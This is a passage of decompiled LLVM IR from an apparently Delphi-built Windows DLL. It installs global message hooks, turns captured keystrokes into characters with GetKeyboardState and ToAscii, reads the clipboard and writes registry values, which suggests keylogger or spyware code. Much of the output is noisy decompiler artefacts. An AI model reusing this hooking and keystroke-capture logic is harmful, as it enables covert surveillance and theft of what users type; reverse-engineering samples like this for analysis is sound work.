  %88 = inttoptr i32 %87 to i32*, !insn.addr !723
  store i32 0, i32* %88, align 4, !insn.addr !723
  %89 = add i32 %esp.1.reload, -16, !insn.addr !724
  %90 = inttoptr i32 %89 to i32*, !insn.addr !724
  store i32 ptrtoint ([10 x i8]* @global_var_405410 to i32), i32* %90, align 4, !insn.addr !724
  %91 = add i32 %arg6, -8, !insn.addr !725
  %92 = inttoptr i32 %91 to i32*, !insn.addr !725
  %93 = load i32, i32* %92, align 4, !insn.addr !725
  %94 = add i32 %esp.1.reload, -20, !insn.addr !726
  %95 = inttoptr i32 %94 to i32*, !insn.addr !726
  store i32 %93, i32* %95, align 4, !insn.addr !726
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !727
  %97 = load i32, i32* %92, align 4, !insn.addr !728
  %98 = add i32 %esp.1.reload, -24, !insn.addr !729
  %99 = inttoptr i32 %98 to i32*, !insn.addr !729
  store i32 %97, i32* %99, align 4, !insn.addr !729
  %100 = call i32 @function_4043a0(), !insn.addr !730
  %101 = load i32, i32* %99, align 4, !insn.addr !731
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !732
  store i32 4215789, i32* %90, align 4, !insn.addr !733
  %102 = call i32 @"@LStrClr"(), !insn.addr !734
  ret i32 %102, !insn.addr !735
}

define i32 @function_4053e6() local_unnamed_addr {
dec_label_pc_4053e6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !736
  ret i32 %0, !insn.addr !736
}

define i32 @function_4053eb() local_unnamed_addr {
dec_label_pc_4053eb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !737
}

define i32 @function_4053ed() local_unnamed_addr {
dec_label_pc_4053ed:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !738
}

define i32 @function_4053f1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4053f1:
  %.reg2mem = alloca i32, !insn.addr !739
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !739
  %5 = inttoptr i32 %2 to i8*, !insn.addr !739
  store i8 %4, i8* %5, align 1, !insn.addr !739
  %6 = add i32 %0, 111, !insn.addr !740
  %7 = inttoptr i32 %6 to i8*, !insn.addr !740
  %8 = load i8, i8* %7, align 1, !insn.addr !740
  %9 = trunc i32 %1 to i8, !insn.addr !740
  %10 = add i8 %8, %9, !insn.addr !740
  %11 = icmp eq i8 %10, 0, !insn.addr !740
  store i8 %10, i8* %7, align 1, !insn.addr !740
  br i1 %11, label %12, label %dec_label_pc_4053f9, !insn.addr !741

; <label>:12:                                     ; preds = %dec_label_pc_4053f1
  %13 = call i32 @unknown_5470(), !insn.addr !741
  br label %dec_label_pc_4053f9, !insn.addr !741

dec_label_pc_4053f9:                              ; preds = %12, %dec_label_pc_4053f1
  %14 = icmp ult i8 %10, %8, !insn.addr !740
  br i1 %14, label %dec_label_pc_405461, label %dec_label_pc_4053fc, !insn.addr !742

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_4053f9
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !686, !insn.addr !740
  %16 = and i8 %15, 1, !insn.addr !740
  %17 = icmp eq i8 %16, 0, !insn.addr !740
  %18 = trunc i32 %arg4 to i16, !insn.addr !743
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !743
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !743
  store i32 %19, i32* %20, align 4, !insn.addr !743
  br i1 %17, label %dec_label_pc_40545c, label %dec_label_pc_405400, !insn.addr !744

dec_label_pc_405400:                              ; preds = %dec_label_pc_4053fc
  %21 = add i32 %arg4, 1, !insn.addr !745
  %22 = icmp eq i32 %21, 0, !insn.addr !745
  store i32 %arg2, i32* %.reg2mem, !insn.addr !746
  br i1 %22, label %dec_label_pc_405467, label %dec_label_pc_405406, !insn.addr !746

dec_label_pc_405406:                              ; preds = %dec_label_pc_405400
  %23 = add i32 %arg2, -1, !insn.addr !747
  %24 = trunc i32 %21 to i16, !insn.addr !748
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !748
  %26 = load i32, i32* %25, align 4, !insn.addr !748
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !748
  %27 = load i32, i32* %25, align 4, !insn.addr !749
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !749
  %28 = add i32 %arg7, 105, !insn.addr !750
  %29 = inttoptr i32 %28 to i8*, !insn.addr !750
  %30 = load i8, i8* %29, align 1, !insn.addr !750
  %31 = trunc i32 %23 to i8, !insn.addr !750
  %32 = add i8 %30, %31, !insn.addr !750
  %33 = icmp eq i8 %32, 0, !insn.addr !750
  store i8 %32, i8* %29, align 1, !insn.addr !750
  br i1 %33, label %dec_label_pc_405436, label %dec_label_pc_405416, !insn.addr !751

dec_label_pc_405416:                              ; preds = %dec_label_pc_405406
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !752
  %34 = inttoptr i32 %23 to i8*, !insn.addr !753
  %35 = load i8, i8* %34, align 1, !insn.addr !753
  %36 = add i8 %35, %31, !insn.addr !753
  store i8 %36, i8* %34, align 1, !insn.addr !753
  %37 = add i32 %arg5, 86, !insn.addr !754
  %38 = inttoptr i32 %37 to i8*, !insn.addr !754
  %39 = load i8, i8* %38, align 1, !insn.addr !754
  %40 = trunc i32 %21 to i8, !insn.addr !754
  %41 = add i8 %39, %40, !insn.addr !754
  store i8 %41, i8* %38, align 1, !insn.addr !754
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !755
  %42 = call i32 @"@LStrClr"(), !insn.addr !756
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !757
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !758
  %44 = zext i1 %43 to i32, !insn.addr !759
  ret i32 %44, !insn.addr !759

dec_label_pc_405436:                              ; preds = %dec_label_pc_405406
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !760
  %46 = inttoptr i32 %45 to i8*, !insn.addr !760
  %47 = load i8, i8* %46, align 2, !insn.addr !760
  %48 = mul i8 %47, 2, !insn.addr !760
  store i8 %48, i8* %46, align 2, !insn.addr !760
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !761
  %50 = icmp eq i32* %49, null, !insn.addr !762
  br i1 %50, label %dec_label_pc_405461, label %dec_label_pc_405446, !insn.addr !763

dec_label_pc_405446:                              ; preds = %dec_label_pc_405436
  %51 = ptrtoint i32* %49 to i32, !insn.addr !761
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !764
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !765
  %53 = icmp eq i32* %52, null, !insn.addr !766
  br i1 %53, label %dec_label_pc_405461, label %dec_label_pc_405452, !insn.addr !767

dec_label_pc_405452:                              ; preds = %dec_label_pc_405446
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !768
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !769
  br label %dec_label_pc_40545c, !insn.addr !769

dec_label_pc_40545c:                              ; preds = %dec_label_pc_405452, %dec_label_pc_4053fc
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !770
  br label %dec_label_pc_405461, !insn.addr !770

dec_label_pc_405461:                              ; preds = %dec_label_pc_40545c, %dec_label_pc_405446, %dec_label_pc_405436, %dec_label_pc_4053f9
  %56 = call i1 @CloseClipboard(), !insn.addr !771
  %57 = sext i1 %56 to i32, !insn.addr !771
  store i32 %57, i32* %.reg2mem, !insn.addr !772
  br label %dec_label_pc_405467, !insn.addr !772

dec_label_pc_405467:                              ; preds = %dec_label_pc_405400, %dec_label_pc_405461
  %.reload = load i32, i32* %.reg2mem, !insn.addr !773
  ret i32 %.reload, !insn.addr !773
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_40546c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !774
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !774
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !775
  %4 = inttoptr i32 %3 to i32*, !insn.addr !776
  %5 = load i32, i32* %4, align 4, !insn.addr !776
  %6 = icmp eq i32 %5, 0, !insn.addr !776
  %7 = icmp eq i1 %6, false, !insn.addr !777
  %8 = icmp eq i1 %7, false, !insn.addr !778
  br i1 %8, label %dec_label_pc_4054a8, label %dec_label_pc_40547f, !insn.addr !778

dec_label_pc_40547f:                              ; preds = %dec_label_pc_40546c
  %9 = inttoptr i32 %0 to i8*, !insn.addr !779
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !780
  %11 = icmp eq i32* %10, null, !insn.addr !781
  %12 = icmp eq i1 %11, false, !insn.addr !782
  br i1 %12, label %dec_label_pc_4054a8, label %dec_label_pc_405492, !insn.addr !782

dec_label_pc_405492:                              ; preds = %dec_label_pc_40547f
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4222148 to i32*), i32 0, i32* null), !insn.addr !783
  br label %dec_label_pc_4054a8, !insn.addr !783

dec_label_pc_4054a8:                              ; preds = %dec_label_pc_405492, %dec_label_pc_40547f, %dec_label_pc_40546c
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !784
  store i32 0, i32* %15, align 4, !insn.addr !784
  ret i32 -2147221231, !insn.addr !785
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4054d4:
  ret i32 0, !insn.addr !786
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4054d8:
  ret i32 0, !insn.addr !787
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4054dc:
  ret i32 0, !insn.addr !788
}

define i32 @function_4054e0() local_unnamed_addr {
dec_label_pc_4054e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !789
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !789
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !789
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !790
  %2 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !791
  %3 = add i32 %2, 1, !insn.addr !791
  store i32 %3, i32* @global_var_4096b0, align 4, !insn.addr !791
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !792
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !793
  ret i32 0, !insn.addr !794
}

define i32 @function_405505() local_unnamed_addr {
dec_label_pc_405505:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !795
  ret i32 %0, !insn.addr !795
}

define i32 @function_40550a() local_unnamed_addr {
dec_label_pc_40550a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !796
}

define i32 @function_40550c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40550c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !797
}

define i32 @function_405510() local_unnamed_addr {
dec_label_pc_405510:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !798
  %2 = add i32 %1, -1, !insn.addr !798
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !798
  ret i32 %0, !insn.addr !799
}

define i32 @function_405518(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405518:
  %esp.0.reg2mem = alloca i32, !insn.addr !800
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !801
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !801
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !801
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !802
  %4 = call i32 @function_4077a8(), !insn.addr !803
  %5 = icmp ne i32 %4, 0, !insn.addr !804
  %6 = icmp eq i1 %5, false, !insn.addr !805
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !806
  br i1 %6, label %dec_label_pc_405613, label %dec_label_pc_405555, !insn.addr !806

dec_label_pc_405555:                              ; preds = %dec_label_pc_405518
  switch i32 %0, label %dec_label_pc_40559f [
    i32 8, label %dec_label_pc_405563
    i32 46, label %dec_label_pc_405582
  ]

dec_label_pc_405563:                              ; preds = %dec_label_pc_405555
  %7 = call i32 @function_407844(), !insn.addr !807
  %8 = call i32 @"@LStrDelete"(), !insn.addr !808
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !809
  br label %dec_label_pc_405613, !insn.addr !809

dec_label_pc_405582:                              ; preds = %dec_label_pc_405555
  %9 = call i32 @function_407844(), !insn.addr !810
  %10 = call i32 @"@LStrDelete"(), !insn.addr !811
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !812
  br label %dec_label_pc_405613, !insn.addr !812

dec_label_pc_40559f:                              ; preds = %dec_label_pc_405555
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !813
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !814
  %14 = udiv i32 %1, 65536, !insn.addr !815
  %15 = and i32 %14, 255, !insn.addr !816
  %16 = inttoptr i32 %15 to i16*, !insn.addr !817
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !818
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !819
  %19 = icmp eq i32 %18, 1, !insn.addr !820
  %20 = icmp eq i1 %19, false, !insn.addr !821
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !821
  br i1 %20, label %dec_label_pc_405613, label %dec_label_pc_4055cb, !insn.addr !821

dec_label_pc_4055cb:                              ; preds = %dec_label_pc_40559f
  %21 = call i32 @function_40750c(), !insn.addr !822
  %22 = icmp eq i32 %21, 0, !insn.addr !823
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !824
  br i1 %22, label %dec_label_pc_405613, label %dec_label_pc_4055d7, !insn.addr !824

dec_label_pc_4055d7:                              ; preds = %dec_label_pc_4055cb
  %23 = call i32 @function_4034f4(), !insn.addr !825
  %24 = icmp sgt i32 %23, 15, !insn.addr !826
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !826
  br i1 %24, label %dec_label_pc_405613, label %dec_label_pc_4055e8, !insn.addr !826

dec_label_pc_4055e8:                              ; preds = %dec_label_pc_4055d7
  %25 = call i32 @function_407844(), !insn.addr !827
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !828
  %27 = call i32 @"@LStrInsert"(), !insn.addr !829
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !829
  br label %dec_label_pc_405613, !insn.addr !829

dec_label_pc_405613:                              ; preds = %dec_label_pc_4055e8, %dec_label_pc_4055d7, %dec_label_pc_4055cb, %dec_label_pc_40559f, %dec_label_pc_405582, %dec_label_pc_405563, %dec_label_pc_405518
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !830
  %29 = load i32, i32* %28, align 4, !insn.addr !830
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !831
  %30 = add i32 %esp.0.reload, 8, !insn.addr !832
  %31 = inttoptr i32 %30 to i32*, !insn.addr !832
  store i32 4216371, i32* %31, align 4, !insn.addr !832
  %32 = call i32 @"@LStrClr"(), !insn.addr !833
  ret i32 %32, !insn.addr !834
}

define i32 @function_40562c() local_unnamed_addr {
dec_label_pc_40562c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !835
  ret i32 %0, !insn.addr !835
}

define i32 @function_405631() local_unnamed_addr {
dec_label_pc_405631:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !836
}

define i32 @function_405633(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405633:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !837
}

define i32 @function_40563c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40563c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !838
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !838
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !838
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !839
  %2 = call i32 @function_4077a8(), !insn.addr !840
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !841
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !842
  %4 = add i32 %1, 8, !insn.addr !843
  %5 = inttoptr i32 %4 to i32*, !insn.addr !843
  store i32 4216578, i32* %5, align 4, !insn.addr !843
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !844
  ret i32 %6, !insn.addr !845
}

define i32 @function_4056fb() local_unnamed_addr {
dec_label_pc_4056fb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !846
  ret i32 %0, !insn.addr !846
}

define i32 @function_405700() local_unnamed_addr {
dec_label_pc_405700:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !847
}

define i32 @function_405702(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405702:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !848
}

define i32 @function_405708(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405708:
  %esp.0.reg2mem = alloca i32, !insn.addr !849
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !850
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !850
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !850
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !851
  %3 = call i32 @function_407718(), !insn.addr !852
  %4 = icmp eq i32 %3, 0, !insn.addr !853
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !854
  br i1 %4, label %dec_label_pc_40576c, label %dec_label_pc_405729, !insn.addr !854

dec_label_pc_405729:                              ; preds = %dec_label_pc_405708
  %5 = inttoptr i32 %0 to i8*, !insn.addr !855
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405790 to i32*), i8* null, i8* %5), !insn.addr !856
  %7 = ptrtoint i32* %6 to i32, !insn.addr !856
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !857
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !857
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !858
  %10 = icmp eq i1 %9, false, !insn.addr !859
  br i1 %10, label %dec_label_pc_405767, label %dec_label_pc_405744, !insn.addr !860

dec_label_pc_405744:                              ; preds = %dec_label_pc_405729
  %11 = call i32 @function_407578(), !insn.addr !861
  %12 = call i32 @"@LStrAsg"(), !insn.addr !862
  %13 = call i32 @function_4078a0(), !insn.addr !863
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !864
  br label %dec_label_pc_40576c, !insn.addr !864

dec_label_pc_405767:                              ; preds = %dec_label_pc_405729
  %14 = call i32 @function_4079d4(), !insn.addr !865
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !865
  br label %dec_label_pc_40576c, !insn.addr !865

dec_label_pc_40576c:                              ; preds = %dec_label_pc_405767, %dec_label_pc_405744, %dec_label_pc_405708
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !866
  %16 = load i32, i32* %15, align 4, !insn.addr !866
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !867
  %17 = add i32 %esp.0.reload, 8, !insn.addr !868
  %18 = inttoptr i32 %17 to i32*, !insn.addr !868
  store i32 4216713, i32* %18, align 4, !insn.addr !868
  %19 = call i32 @"@LStrClr"(), !insn.addr !869
  ret i32 %19, !insn.addr !870
}

define i32 @function_405782() local_unnamed_addr {
dec_label_pc_405782:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !871
  ret i32 %0, !insn.addr !871
}

define i32 @function_405787() local_unnamed_addr {
dec_label_pc_405787:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !872
}

define i32 @function_405789(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405789:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !873
}

define i32 @function_40578d() local_unnamed_addr {
dec_label_pc_40578d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !874
  %8 = inttoptr i32 %4 to i8*, !insn.addr !874
  store i8 %7, i8* %8, align 1, !insn.addr !874
  %9 = add i32 %2, 111, !insn.addr !875
  %10 = inttoptr i32 %9 to i8*, !insn.addr !875
  %11 = load i8, i8* %10, align 1, !insn.addr !875
  %12 = load i32, i32* %eax, align 4, !insn.addr !875
  %13 = trunc i32 %12 to i8, !insn.addr !875
  %14 = add i8 %11, %13, !insn.addr !875
  store i8 %14, i8* %10, align 1, !insn.addr !875
  %15 = trunc i32 %3 to i16, !insn.addr !876
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !876
  %17 = inttoptr i32 %0 to i32*, !insn.addr !876
  store i32 %16, i32* %17, align 4, !insn.addr !876
  %18 = add i32 %0, 66, !insn.addr !877
  %19 = inttoptr i32 %18 to i64*, !insn.addr !877
  %20 = load i64, i64* %19, align 4, !insn.addr !877
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !877
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !878
  %22 = load i8, i8* %5, align 4, !insn.addr !879
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !879
  %25 = add i8 %22, %24, !insn.addr !879
  %26 = inttoptr i32 %23 to i8*, !insn.addr !879
  store i8 %25, i8* %26, align 1, !insn.addr !879
  %27 = add i32 %21, -117, !insn.addr !880
  %28 = inttoptr i32 %27 to i8*, !insn.addr !880
  %29 = load i8, i8* %28, align 1, !insn.addr !880
  %30 = trunc i32 %3 to i8, !insn.addr !880
  %31 = add i8 %29, %30, !insn.addr !880
  store i8 %31, i8* %28, align 1, !insn.addr !880
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !881
  %33 = add i32 %21, 16, !insn.addr !882
  %34 = inttoptr i32 %33 to i32*, !insn.addr !882
  %35 = load i32, i32* %34, align 4, !insn.addr !882
  %36 = add i32 %21, 12, !insn.addr !883
  %37 = inttoptr i32 %36 to i32*, !insn.addr !883
  %38 = load i32, i32* %37, align 4, !insn.addr !883
  %39 = add i32 %21, 8, !insn.addr !884
  %40 = inttoptr i32 %39 to i32*, !insn.addr !884
  %41 = load i32, i32* %40, align 4, !insn.addr !884
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !885
  %43 = inttoptr i32 %42 to i32*, !insn.addr !886
  %44 = load i32, i32* %43, align 4, !insn.addr !886
  %45 = icmp eq i32 %44, 0, !insn.addr !886
  %46 = icmp eq i1 %45, false, !insn.addr !887
  %47 = icmp eq i32 %41, 0, !insn.addr !888
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !889
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_4057c3, label %dec_label_pc_4057f2, !insn.addr !890

dec_label_pc_4057c3:                              ; preds = %dec_label_pc_40578d
  store i32 %35, i32* %eax, align 4, !insn.addr !891
  %51 = add i32 %35, 4, !insn.addr !892
  %52 = inttoptr i32 %51 to i32*, !insn.addr !892
  %53 = load i32, i32* %52, align 4, !insn.addr !892
  switch i32 %53, label %dec_label_pc_4057f2 [
    i32 256, label %dec_label_pc_4057da
    i32 770, label %dec_label_pc_4057eb
  ]

dec_label_pc_4057da:                              ; preds = %dec_label_pc_4057c3
  %54 = call i32 @function_405518(i32 %2, i32 %1, i32 %0), !insn.addr !893
  br label %dec_label_pc_4057f2, !insn.addr !894

dec_label_pc_4057eb:                              ; preds = %dec_label_pc_4057c3
  %55 = call i32 @function_40563c(i32 %2, i32 %1, i32 %0), !insn.addr !895
  br label %dec_label_pc_4057f2, !insn.addr !895

dec_label_pc_4057f2:                              ; preds = %dec_label_pc_40578d, %dec_label_pc_4057c3, %dec_label_pc_4057eb, %dec_label_pc_4057da
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !896
  %57 = inttoptr i32 %35 to i32*, !insn.addr !897
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !897
  ret i32 %58, !insn.addr !898
}

define i32 @function_405808(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !899
  %5 = icmp eq i1 %4, false, !insn.addr !900
  %6 = icmp eq i32 %arg3, 0, !insn.addr !901
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405826, label %dec_label_pc_405838, !insn.addr !902

dec_label_pc_405826:                              ; preds = %dec_label_pc_405808
  %8 = add i32 %arg1, 8, !insn.addr !903
  %9 = inttoptr i32 %8 to i32*, !insn.addr !903
  %10 = load i32, i32* %9, align 4, !insn.addr !903
  %11 = icmp eq i32 %10, 2, !insn.addr !904
  %12 = icmp eq i1 %11, false, !insn.addr !905
  br i1 %12, label %dec_label_pc_405838, label %dec_label_pc_405830, !insn.addr !905

dec_label_pc_405830:                              ; preds = %dec_label_pc_405826
  %13 = call i32 @function_405708(i32 %1, i32 %2, i32 %0), !insn.addr !906
  br label %dec_label_pc_405838, !insn.addr !906

dec_label_pc_405838:                              ; preds = %dec_label_pc_405808, %dec_label_pc_405830, %dec_label_pc_405826
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !907
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !908
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !908
  ret i32 %16, !insn.addr !909
}

define i32 @function_405850() local_unnamed_addr {
dec_label_pc_405850:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4216732 to i32*), i32 3), !insn.addr !910
  %2 = ptrtoint i32* %1 to i32, !insn.addr !910
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !911
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216840 to i32*), i32 4), !insn.addr !912
  %5 = ptrtoint i32* %4 to i32, !insn.addr !912
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !913
  ret i32 %5, !insn.addr !914
}

define i32 @function_405888() local_unnamed_addr {
dec_label_pc_405888:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !915
  %1 = inttoptr i32 %0 to i32*, !insn.addr !916
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !916
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !917
  %4 = inttoptr i32 %3 to i32*, !insn.addr !918
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !918
  %6 = sext i1 %5 to i32, !insn.addr !918
  ret i32 %6, !insn.addr !919
}

define i32 @function_4058a0() local_unnamed_addr {
dec_label_pc_4058a0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !920
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !920
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !920
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !921
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !922
  %3 = add i32 %2, 1, !insn.addr !922
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !922
